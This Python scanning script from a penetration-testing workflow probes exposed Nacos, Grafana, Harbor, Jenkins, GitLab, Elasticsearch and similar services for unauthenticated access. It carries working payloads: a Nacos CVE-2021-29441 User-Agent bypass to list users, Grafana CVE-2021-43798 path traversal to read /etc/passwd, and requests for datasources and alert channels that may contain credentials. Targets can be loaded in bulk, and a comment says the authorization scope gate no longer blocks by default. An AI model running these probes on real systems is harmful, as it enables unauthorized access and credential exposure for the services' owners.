# -*- coding: utf-8 -*-
"""carrier_probe.py — 载体未授权证据采集（只读 GET/POST，不试默认口令，不写任何数据）。

设计原则（AGENTS.md §5）：脚本只**采集原始响应**，不做硬归类；判读交回大脑。
每条探测都自动附**负控路径**（同前缀的随机不存在路径），用于区分「真未授权接口」与「catch-all」。

用法：
  $py scripts/carrier_probe.py --carrier Nacos --host https://x.com
  $py scripts/carrier_probe.py --from results/carrier-hunt-20260922.json --limit 20
"""
import argparse, json, sys, time
from datetime import datetime
from pathlib import Path
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
B = Path(r"D:\渗透工作流\_PT工作台")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
NC = "zz_nonexistent_q7x"
def H(extra=None):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if extra: h.update(extra)
    return h
# (label, method, path, extra headers, body, is_control)
P = {}
def reg(name, rows): P[name] = rows
reg("Nacos", [
 ("首页/版本", "GET", "/nacos/", None, None, 0),
 ("未授权用户列表(CVE-2021-29441)", "GET", "/nacos/v1/auth/users?pageNo=1&pageSize=10", {"User-Agent": "Nacos-Server"}, None, 0),
 ("负控-同前缀", "GET", "/nacos/v1/auth/" + NC, {"User-Agent": "Nacos-Server"}, None, 1),
 ("控制台状态", "GET", "/nacos/v1/console/server/state", None, None, 0),
 ("默认口令探测位(不提交)", "GET", "/nacos/v1/auth/users?search=accurate&pageNo=1&pageSize=1", {"User-Agent": "Nacos-Server"}, None, 0),
])
reg("Nacos-title", P["Nacos"])
reg("XXL-JOB-app", [
 ("登录页", "GET", "/xxl-job-admin/", None, None, 0),
 ("未授权任务列表", "GET", "/xxl-job-admin/jobinfo/pageList?start=0&length=10", None, None, 0),
 ("负控-同前缀", "GET", "/xxl-job-admin/jobinfo/" + NC, None, None, 1),
 ("未授权执行器列表", "GET", "/xxl-job-admin/jobgroup/pageList?start=0&length=10", None, None, 0),
])
reg("XXL-JOB-body", P["XXL-JOB-app"])
reg("MinIO", [
 ("健康检查", "GET", "/minio/health/live", None, None, 0),
 ("匿名桶列举", "GET", "/", None, None, 0),
 ("负控-同前缀", "GET", "/" + NC, None, None, 1),
])
reg("Harbor", [
 ("未授权项目列表(CVE-2022-46463)", "GET", "/api/v2.0/projects?page_size=5", None, None, 0),
 ("负控-同前缀", "GET", "/api/v2.0/" + NC, None, None, 1),
 ("系统信息", "GET", "/api/v2.0/systeminfo", None, None, 0),
 ("健康", "GET", "/api/v2.0/health", None, None, 0),
])
reg("Jenkins", [
 ("API JSON 作业树", "GET", "/api/json?tree=jobs[name,url]", None, None, 0),
 ("负控-同前缀", "GET", "/api/json/" + NC, None, None, 1),
 ("登录页", "GET", "/login", None, None, 0),
 ("CLI jar 版本头", "HEAD", "/jnlpJars/jenkins-cli.jar", None, None, 0),
])
reg("Grafana", [
 ("版本(公开)", "GET", "/api/health", None, None, 0),
 ("CVE-2021-43798 原样", "GET", "/public/plugins/alertlist/../../../../../../../../etc/passwd", None, None, 0),
 (
  "CVE-2021-43798 编码", "GET", "/public/plugins/alertlist/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", None, None, 0),
 ("负控-同前缀", "GET", "/public/plugins/" + NC + "/../../../../../../../../etc/passwd", None, None, 1),
 ("未授权首页仪表盘", "GET", "/api/dashboards/home", None, None, 0),
])
reg("Grafana-deep", [
 ("版本", "GET", "/api/health", None, None, 0),
 ("匿名仪表盘搜索", "GET", "/api/search?query=&type=dash-db", None, None, 0),
 ("数据源列表(含凭据?)", "GET", "/api/datasources", None, None, 0),
 ("组织信息", "GET", "/api/org", None, None, 0),
 ("用户列表", "GET", "/api/users", None, None, 0),
 ("负控-同前缀", "GET", "/api/" + NC, None, None, 1),
 ("匿名首页仪表盘", "GET", "/api/dashboards/home", None, None, 0),
 ("全部仪表盘(不带type)", "GET", "/api/search", None, None, 0),
 ("告警通道(可能含token)", "GET", "/api/alert-notifications", None, None, 0),
 ("插件列表", "GET", "/api/plugins", None, None, 0),
])
reg("YApi", [
 ("项目列表(未授权)", "POST", "/api/project/list", {"Content-Type": "application/json"}, "{\"page\":1,\"limit\":10}", 0),
 ("负控-同前缀", "POST", "/api/project/" + NC, {"Content-Type": "application/json"}, "{}", 1),
 ("用户状态", "GET", "/api/user/status", None, None, 0),
])
reg("RuoYi", [
 ("druid 监控台", "GET", "/prod-api/druid/index.html", None, None, 0),
 ("swagger 文档", "GET", "/prod-api/swagger-ui/index.html", None, None, 0),
 ("负控-同前缀", "GET", "/prod-api/" + NC, None, None, 1),
 ("验证码接口", "GET", "/prod-api/captchaImage", None, None, 0),
])
reg("SonarQube", [
 ("未授权项目搜索", "GET", "/api/projects/search?ps=5", None, None, 0),
 ("负控-同前缀", "GET", "/api/projects/" + NC, None, None, 1),
 ("系统状态", "GET", "/api/system/status", None, None, 0),
 ("认证校验", "GET", "/api/authentication/validate", None, None, 0),
])
reg("Kibana", [
 ("未授权状态", "GET", "/api/status", None, None, 0),
 ("负控-同前缀", "GET", "/api/" + NC, None, None, 1),
 ("未授权空间列表", "GET", "/api/spaces/space", None, None, 0),
])
reg("Elasticsearch", [
 ("未授权索引列表", "GET", "/_cat/indices?v", None, None, 0),
 ("根信息", "GET", "/", None, None, 0),
 ("负控-同前缀", "GET", "/" + NC, None, None, 1),
 ("未授权集群健康", "GET", "/_cluster/health", None, None, 0),
])
reg("RabbitMQ", [
 ("未授权管理概览", "GET", "/api/overview", None, None, 0),
 ("负控-同前缀", "GET", "/api/" + NC, None, None, 1),
 ("未授权队列", "GET", "/api/queues", None, None, 0),
])
reg("Metabase", [
 ("session properties(setup-token)", "GET", "/api/session/properties", None, None, 0),
 ("负控-同前缀", "GET", "/api/session/" + NC, None, None, 1),
 ("健康", "GET", "/api/health", None, None, 0),
])
reg("Superset", [
 ("未授权仪表盘", "GET", "/api/v1/dashboard/?q=(page_size:5)", None, None, 0),
 ("负控-同前缀", "GET", "/api/v1/" + NC, None, None, 1),
 ("健康", "GET", "/health", None, None, 0),
])
reg("GitLab", [
 ("公开项目API", "GET", "/api/v4/projects?per_page=5", None, None, 0),
 ("负控-同前缀", "GET", "/api/v4/" + NC, None, None, 1),
 ("版本(需登录)", "GET", "/api/v4/version", None, None, 0),
])
reg("GitLab-deep", [
 ("登录页(版本?)", "GET", "/users/sign_in", None, None, 0),
 ("开放注册检测", "GET", "/users/sign_up", None, None, 0),
 ("负控-同前缀", "GET", "/users/" + NC, None, None, 1),
 ("未授权公开项目API", "GET", "/api/v4/projects?per_page=10", None, None, 0),
 ("未授权用户列表API", "GET", "/api/v4/users?per_page=5", None, None, 0),
 ("版本(需登录)", "GET", "/api/v4/version", None, None, 0),
 ("帮助页(含版本)", "GET", "/help", None, None, 0),
 ("未授权群组API", "GET", "/api/v4/groups?per_page=10", None, None, 0),
])
reg("Sentinel", [
 ("登录页", "GET", "/auth/login", None, None, 0),
 ("未授权规则", "GET", "/api/v1/flow/rules", None, None, 0),
 ("负控-同前缀", "GET", "/api/v1/" + NC, None, None, 1),
])
reg("BaoTa", [
 ("面板登录页", "GET", "/login", None, None, 0),
 ("负控-同前缀", "GET", "/" + NC, None, None, 1),
])
reg("Dify", [
 ("OpenAPI 欢迎页(版本)", "GET", "/v1/", None, None, 0),
 ("控制台初始化状态", "GET", "/console/api/setup", None, None, 0),
 ("负控-同前缀", "GET", "/console/api/" + NC, None, None, 1),
])
def norm(h):
    h = str(h).strip()
    if not h.startswith("http"): h = "https://" + h
    return h.rstrip("/")
def probe(base, rows, timeout=12):
    res = []
    for label, m, path, extra, body, ctl in rows:
        url = base + path
        rec = {"label": label, "method": m, "url": url, "control": bool(ctl)}
        try:
            try:
                r = requests.request(m, url, headers=H(extra), data=body, timeout=timeout,
                                     verify=False, allow_redirects=False)
            except (requests.exceptions.SSLError, requests.exceptions.ConnectionError) as e0:
                alt = url.replace("https://", "http://", 1) if url.startswith("https://") else url.replace("http://", "https://", 1)
                if alt == url: raise e0
                r = requests.request(m, alt, headers=H(extra), data=body, timeout=timeout,
                                     verify=False, allow_redirects=False)
                rec["scheme_fallback"] = alt.split("//")[0]
            ct = r.headers.get("Content-Type", "")
            txt = r.text[:600]
            rec.update({"status": r.status_code, "ctype": ct[:60], "len": len(r.content),
                        "loc": r.headers.get("Location", "")[:90], "head": txt[:220]})
        except Exception as e:
            rec.update({"status": None, "err": "%s: %s" % (type(e).__name__, str(e)[:80])})
        res.append(rec)
    return res
def show(host, rows):
    print("")
    print("=== %s ===" % host)
    for r in rows:
        tag = "负控" if r.get("control") else "    "
        st = r.get("status")
        if st is None:
            print("  %s %-34s ERR  %s" % (tag, r["label"][:34], r.get("err", "")[:70])); continue
        print("  %s %-34s %s %-26s %6s  %s" % (tag, r["label"][:34], st, r.get("ctype", "")[:26],
                                               r.get("len", 0), (r.get("loc") or "")[:40]))
        hd = (r.get("head") or "").replace("\n", " ").replace("\r", " ")[:150]
        if hd.strip():
            print("        %s" % hd)
    return rows
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--carrier")
    ap.add_argument("--host", action="append")
    ap.add_argument("--hosts", help="逗号分隔的多个目标")
    ap.add_argument("--from-json", dest="from_json")
    ap.add_argument("--limit", type=int, default=15)
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--out")
    ap.add_argument("--allow-scope", default=None,
                    help="（保留参数）仅作记录，新版 scope_gate 默认不阻断")
    ap.add_argument("--no-scope-gate", action="store_true",
                    help="【危险】跳过授权范围闸门——只应在已人工核实归属后使用，默认禁止")
    a = ap.parse_args()
    out = {"generated": datetime.now().isoformat(timespec="seconds"), "targets": []}
    jobs = []
    for hh in (a.host or []):
        jobs.append((a.carrier or "Nacos", hh))
    for hh in (a.hosts or "").split(","):
        if hh.strip(): jobs.append((a.carrier or "Nacos", hh.strip()))
    if a.from_json:
        fp = Path(a.from_json)
        if not fp.is_absolute(): fp = B / a.from_json
        d = json.loads(fp.read_text(encoding="utf-8"))
        for cname, cv in (d.get("carriers") or {}).items():
            for hh in (cv.get("hosts") or [])[:a.limit]:
                jobs.append((cname, hh["host"]))
    if not jobs:
        print("UNSURE: 没给 --host 或 --from"); return 2
    # === 范围登记（2026-10-01 改造：默认不阻断，仅 strict_scope 项目才拦）===
    if a.no_scope_gate:
        print("!! --no-scope-gate：跳过授权范围闸门，**风险自担**")
    else:
        sys.path.insert(0, str(Path(__file__).resolve().parent))
        import scope_gate
    for cname, host in jobs:
        rows = P.get(cname)
        if not rows:
            print("UNSURE: 未登记载体 %r" % cname); continue
        base = norm(host)
        if not a.no_scope_gate:
            ok, sr = scope_gate.gate(base, a.allow_scope, verbose=True)
            if not ok:
                print("  ==> 跳过 %s（授权范围未过，不发任何请求）" % base)
                out["targets"].append({"carrier": cname, "base": base, "blocked": True, "scope": sr})
                continue
        got = probe(base, rows, a.timeout)
        show(base, got)
        out["targets"].append({"carrier": cname, "base": base, "probes": got, "scope": sr})
        time.sleep(0.5)
    op = Path(a.out) if a.out else (B / "results" / ("carrier-probe-%s.json" % datetime.now().strftime("%Y%m%d-%H%M")))
    op.parent.mkdir(parents=True, exist_ok=True)
    op.write_text(json.dumps(out, ensure_ascii=False, indent=1), encoding="utf-8")
    print("")
    print("产物 -> %s" % op)
    print("[done] CARRIERPROBE-END")
if __name__ == "__main__":
    raise SystemExit(main())